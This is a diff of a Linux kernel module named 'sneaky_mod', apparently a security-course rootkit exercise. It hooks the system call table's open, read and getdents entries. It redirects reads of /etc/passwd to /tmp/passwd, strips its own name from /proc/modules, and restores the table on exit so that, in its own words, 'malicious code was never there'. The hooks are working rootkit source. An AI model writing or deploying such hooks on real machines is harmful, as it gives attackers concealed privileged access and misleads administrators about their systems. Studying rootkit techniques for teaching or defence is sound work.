@@ -34,9 +34,7 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yuefan Yu");
 static int pid = 0;
 module_param(pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
-char *processname = "sneaky_process";
-char *filename = "/tmp/passwd";
-char *modename = "sneaky_mod";
+
 static int module_pointer = -1;
 struct linux_dirent64 {
   u64 d_ino;               /* 64-bit inode number */
@@ -66,40 +64,47 @@ static int atoi(char *num) {
 // should expect ti find its arguments on the stack (not in registers).
 // This is used for all system calls.
 
-asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage int (*original_open)(const char *pathname, int flags);
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   int fd;
+  // hide new passwd file so that user cannot find we get the permissions
+  // display the unrevised version
   if (strcmp(pathname, "/etc/passwd") == 0) {
-    copy_to_user((void *)pathname, filename, sizeof(filename));
-    fd = original_call(pathname, flags);
-  } else {
-    fd = original_call(pathname, flags);
+    copy_to_user((void *)pathname, "/tmp/passwd", sizeof("/tmp/passwd"));
+    fd = original_open(pathname, flags);
+  }
+  // mark if we open /proc/modules,
+  // we can do further opertion in command "read"
+  else {
+    fd = original_open(pathname, flags);
     if (strcmp(pathname, "/proc/modules") == 0) {
       module_pointer = fd;
     }
   }
   return fd;
 }
-
+char *processname = "sneaky_process";
+char *modename = "sneaky_mod";
 asmlinkage ssize_t (*original_read)(int fd, char *buf, size_t count);
+// Define our new sneaky version of the 'read' syscall
 asmlinkage ssize_t sneaky_sys_read(int fd, char *buf, size_t count) {
-  // printk(KERN_INFO "read:%s", buf);
   ssize_t rest;
   char *start;
   char *end;
   rest = original_read(fd, buf, count);
+  // it is better to use fd here to prevent the effect of context switch
+  // read might not follow with open
+  // hide the module name
   if (module_pointer >= 0 && module_pointer == fd) {
     module_pointer = -1;
-    start = strstr(buf, "sneaky_mod");
-    if (start != NULL) {
-      end = strchr(start, '\n');
-      memmove(start, end + 1, rest - (ssize_t)(end - buf));
+    if ((start = strstr(buf, "sneaky_mod")) != NULL) {
+      end = strchr(start, '\n') + 1;
+      memmove(start, end, rest - (ssize_t)(end - buf));
       rest -= (ssize_t)(end - start);
     }
   }
   return rest;
-  //  return (*orig_read)(fd, buf, count);
 }
 asmlinkage long (*original_getdents)(unsigned int fd,
                                      struct linux_dirent64 __user *dirp,
@@ -150,7 +155,7 @@ static int initialize_sneaky_module(void) {
   // This is the magic! Save away the original 'open' system call
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
-  original_call = (void *)*(sys_call_table + __NR_open);
+  original_open = (void *)*(sys_call_table + __NR_open);
   original_getdents = (void *)*(sys_call_table + __NR_getdents);
   original_read = (void *)*(sys_call_table + __NR_read);
 
@@ -182,7 +187,7 @@ static void exit_sneaky_module(void) {
 
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
+  *(sys_call_table + __NR_open) = (unsigned long)original_open;
   *(sys_call_table + __NR_read) = (unsigned long)original_read;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
 
